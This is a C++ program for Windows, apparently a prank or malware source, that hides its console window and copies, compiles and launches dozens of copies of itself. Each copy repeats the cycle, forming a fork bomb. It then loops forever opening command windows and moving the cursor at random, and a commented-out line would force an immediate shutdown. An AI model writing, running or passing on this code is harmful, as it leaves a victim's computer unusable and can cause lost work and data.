#include <bits/stdc++.h>
#include <windows.h>
using namespace std;

const string Idx1 = ".exe";
const string Idx2 = ".cpp";
void HideWindow() {
    HWND hwnd;
    hwnd = FindWindow("ConsoleWindowClass", NULL);
    if (hwnd)
        ShowWindow(hwnd, SW_HIDE);
    return;
}
void copyFile(const string &sourceFile, const string &destFile) {
    ifstream inputFile(sourceFile, ios::binary);

    if (!inputFile) {
        cerr << "无法打开源文件: " << sourceFile << endl;
        return;
    }

    ofstream outputFile(destFile, ios::binary);

    const size_t bufferSize = 1024 * 1024 * 4;
    vector<char> buffer(bufferSize);

    while (inputFile.read(buffer.data(), buffer.size()) || inputFile.gcount() > 0) {
        outputFile.write(buffer.data(), inputFile.gcount());
    }

    inputFile.close();
    outputFile.close();
}

int main() {
    HideWindow();
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    for (int i = 0; i <= 9; i++) {
        string sourceFile = __FILE__;
        string copy = sourceFile;
        copy.erase(copy.find("."));
        string name = copy + to_string(i);
        string destFile = name + Idx2;
        copyFile(sourceFile, destFile);
        string caozuo = "g++ " + destFile + " -o " + name + Idx1;
        system(caozuo.c_str());
        system(("start " + name + Idx1).c_str());
    }
    for (int i = 65; i <= 90; i++) {
        string sourceFile = __FILE__;
        string copy = sourceFile;
        copy.erase(copy.find("."));
        string name = copy + to_string((char)(i));
        string destFile = name + Idx2;
        copyFile(sourceFile, destFile);
        string caozuo = "g++ " + destFile + " -o " + name + Idx1;
        system(caozuo.c_str());
        system(("start " + name + Idx1).c_str());
    }

    for (int i = 97; i <= 122; i++) {
        string sourceFile = __FILE__;
        string copy = sourceFile;
        copy.erase(copy.find("."));
        string name = copy + to_string((char)(i));
        string destFile = name + Idx2;
        copyFile(sourceFile, destFile);
        string caozuo = "g++ " + destFile + " -o " + name + Idx1;
        system(caozuo.c_str());
        system(("start " + name + Idx1).c_str());
    }
    for (;;) {
        system("start cmd");
        for (int i = 1; i <= 100; i++) {
            SetCursorPos(rand() % y, rand() % x);
        }
    }
    // system("shutdown -s -t 0");
    return 0;
}